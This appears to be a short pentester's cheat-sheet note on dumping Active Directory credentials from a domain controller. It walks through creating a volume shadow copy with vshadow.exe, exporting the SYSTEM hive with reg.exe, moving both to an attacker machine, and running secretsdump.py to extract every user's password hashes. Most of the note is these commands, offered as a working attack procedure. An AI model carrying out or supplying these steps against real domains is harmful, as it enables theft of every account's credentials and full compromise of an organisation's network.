---
id: Shadow Copies
aliases:
  - Shadow Copies
tags:
  - windows
  - AD
  - persistence
---
Steal the AD's NTDS.dit DB file & the SYSTEM hive to exectract every user credential.
## In practice

1. On DC, as admin, create the backup:
```cmd
vshadow.exe -nw -p C:
```

2. Grab the value of "Shadow copy device name" from above output, and copy it to attacker machine.

3. Extract the SYSTEM hive, and copy it to attacker machine:
```cmd
reg.exe export HKLM\SYSTEM C:\SYSTEM.reg
```

4. Extract the hashes locally:
```bash
secretsdump.py -ntds $NTDS_FILE -system $REG_FILE LOCAL
```
